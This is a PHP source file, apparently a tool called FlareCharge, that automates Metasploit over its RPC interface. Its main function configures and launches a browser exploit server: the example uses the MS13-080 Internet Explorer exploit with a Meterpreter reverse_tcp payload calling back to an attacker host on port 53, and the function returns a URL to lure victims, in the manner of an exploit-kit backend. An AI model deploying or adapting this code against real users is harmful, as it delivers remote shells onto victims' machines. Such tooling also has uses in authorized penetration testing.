<?php #
/*
 * FlareCharge (PHPmsfRPC) v0.12 by Tweek Fawkes
 *
 * This script:
 * - provides PHP functions to easily interface with metasploit
 * - interfaces with metasploit via Metasploit's RPC server (msfrpcd)
 *
 * How to use:
 * #1 - Start msfrpcd on a server:
 root@kali:~# ifconfig | grep 192.168.
    inet addr:192.168.192.234  Bcast:192.168.192.255  Mask:255.255.255.0
 root@kali:~# cat msgrpc.rc
    load msgrpc ServerHost=192.168.192.234 Pass=abc123
 root@kali:~# msfconsole -r /root/msgrpc.rc
 ...
 *
 * #2 - Inclucde php file and use functions.
 * This example will start the ms13-080 exploit:
 ...
 require_once ('includes/php_msfrpc_inc.php');
 ...
 $msfrpcd_ip = "192.168.192.234"
 $cb_ip = "192.168.192.234"
 $msf_exploit_full_path = "exploit/windows/browser/ms13_080_cdisplaypointer";
 $msf_payload_full_path = "windows/meterpreter/reverse_tcp";
 $msf_target = "3";
 $msf_url = use_exploit($msfrpcd_ip, $cb_ip, $msf_exploit_full_path, $msf_payload_full_path, $msf_target);
 ...
 * 
 */

// ************ Variables to Set ************ //
$display_errors = 0; # 0 == do not display debug messages; 1 == display debug messages; 

// ************ display_errors() ************ //
function display_errors($verbose = 0)
{
    if($verbose == 0)
    {
	ini_set('display_errors', False);
    }
    elseif($verbose == 1)
    {
	echo '[V] error_reporting is on</br>';
	error_reporting(E_ALL);
	ini_set('display_errors', True);
    }
}

// ************ Setting display_errors() ************ //
display_errors($display_errors);

// ************ debug() ************ //
function debug($msg, $verbose = 0)
{
    if($verbose == 1)
    {
	//echo '<PRE>';
	echo '[V] ' . $msg;
	//echo '</PRE>';
	echo '</BR>';
    }
}

// ************ debug_r() ************ //
function debug_r($msg, $verbose = 0)
{
    if($verbose == 1)
    {
	//echo '<PRE>';
	echo '[V] ';
	print_r($msg);
	//echo '</PRE>';
	echo '</BR>';
    }
}

// ************ curl_post() ************ //
function curl_post($url, $port, $httpheader, $postfields)
{
    debug("START Function curl_post()</br>");

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_PORT , $port); 
    curl_setopt($ch, CURLOPT_VERBOSE, 0); 
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    curl_setopt($ch, CURLOPT_POST, TRUE); 
    curl_setopt($ch, CURLOPT_HTTPGET, FALSE); 
    curl_setopt($ch, CURLOPT_NOBODY, FALSE);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader); 
    
    curl_setopt ($ch, CURLOPT_POSTFIELDS, $postfields);
    
    curl_setopt($ch, CURLOPT_TIMEOUT, CURL_TIMEOUT);    // Timeout
    curl_setopt($ch, CURLOPT_USERAGENT, WEBBOT_NAME);   // Webbot name
    curl_setopt($ch, CURLOPT_VERBOSE, FALSE);           // Minimize logs
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);    // No certificate
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);     // Follow redirects
    curl_setopt($ch, CURLOPT_MAXREDIRS, 4);             // Limit redirections to four
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     // Return in string
    
    $return_array['FILE']   = curl_exec($ch); 
    $return_array['STATUS'] = curl_getinfo($ch);
    $return_array['ERROR']  = curl_error($ch);
    
    curl_close($ch);
    
    debug("END Function curl_post()</br>");
    return $return_array;
}

// ************  msf_auth() ************ //
function msf_auth($ip, $username = "msf", $password = "abc123")
{
	debug("START Function msf_auth()</br>");
	//$data = array(0=>1,1=>2,2=>3);
	$data = array("auth.login", $username, $password);
	
	$msgpack_data = msgpack_pack($data);
	
	$url = "http://".$ip.":55552/api/1.0";
	$port = 55552;
	$httpheader = array("Host: RPC Server", "Content-Length: ".strlen($msgpack_data), "Content-Type: binary/message-pack");
	$postfields = $msgpack_data;
	$return_array = curl_post($url, $port, $httpheader, $postfields);
	
	$msgunpack_data = msgpack_unpack($return_array['FILE']);
	
	$token = $msgunpack_data["token"];
	
	debug("END Function msf_auth()</br>");
	return $token;
}

// ************ msf_cmd() ************ //
function msf_cmd($ip, $client_request)
{

    debug("START Function msf_cmd()</br>");
    
    $msgpack_data = msgpack_pack($client_request);
    
    $url = "http://".$ip.":55552/api/1.0";
    $port = 55552;
    $httpheader = array("Host: RPC Server", "Content-Length: ".strlen($msgpack_data), "Content-Type: binary/message-pack");
    $postfields = $msgpack_data;
    $return_array = curl_post($url, $port, $httpheader, $postfields);
    
    $msgunpack_data = msgpack_unpack($return_array['FILE']);
    
    debug("END Function msf_cmd()</br>");
    return $msgunpack_data;
}

// ************ msf_console() ************ //
function msf_console($ip, $token, $console_id, $cmd)
{
    debug("START Function msf_console()</br>");

    debug('$cmd: ' . $cmd . "</br>");
    
    $client_request = array("console.write", $token, $console_id, $cmd . "\n");
    $server_write_response = msf_cmd($ip, $client_request);
    
    debug('$server_write_response: ');
    debug_r($server_write_response);
    debug('</br>');
    
    debug('$server_write_response["wrote"]: ' . $server_write_response["wrote"] . "</br>");
    
    do
    {
        debug('start do while</br>');
        
        $client_request = array("console.read", $token, $console_id);
        $server_read_response = msf_cmd($ip, $client_request);
        
        debug('$server_read_response: ');
        debug_r($server_read_response);
        debug('</br>');
        
        debug('$server_read_response["data"]: ' . $server_read_response["data"] . "</br>");
        debug('$server_read_response["prompt"]: ' . $server_read_response["prompt"] . "</br>");
        debug('$server_read_response["busy"]: ' . $server_read_response["busy"] . "</br>");
    
        debug('end do while</br>');
    } while($server_read_response["busy"] == 1);
    
    debug("END Function msf_console()</br>");
    return $server_read_response;
}

// ************ msf_execute() ************ //
function msf_execute($ip, $token, $cmd)
{
    $client_request = array("console.execute", $token, $console_id, $cmd . "\n");
    $server_write_response = msf_cmd($ip, $client_request);
}

// ************ use_exploit() ************ //
function use_exploit($ek_ip, $cb_ip, $msf_exploit_full_path, $msf_payload_full_path, $msf_target = -1)
{
    debug("START Function use_exploit()</br>");

    $token = msf_auth($ek_ip);
    
    $client_request = array("core.version", $token);
    $server_response = msf_cmd($ek_ip, $client_request);
    
    $client_request = array("console.create", $token);
    $server_response = msf_cmd($ek_ip, $client_request);
    $console_id_one = $server_response["id"];
    
    $server_response = msf_console($ek_ip, $token, $console_id_one, "use " . $msf_exploit_full_path);
    
    $msf_exploit_name = substr(strrchr($msf_exploit_full_path, "/"), 1 );
    debug("msf_exploit_name: " . $msf_exploit_name . "</BR>");
    
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set URIPATH /" . $msf_exploit_name);
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set SRVPORT 80");
    
    if($msf_target >= 0)
    {
	$server_response = msf_console($ek_ip, $token, $console_id_one, "set TARGET " . $msf_target);
    }
    
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set PAYLOAD " . $msf_payload_full_path);
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set LHOST " . $cb_ip);
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set LPORT 53");
    $server_response = msf_console($ek_ip, $token, $console_id_one, "set DisablePayloadHandler true");
    $server_response = msf_console($ek_ip, $token, $console_id_one, "exploit -j");
    $server_response = msf_console($ek_ip, $token, $console_id_one, "show options");
    
    $msf_url = 'http://' . $ek_ip . '/' . $msf_exploit_name;
    
    debug("END Function use_exploit()</br>");
    
    return $msf_url;
}

?>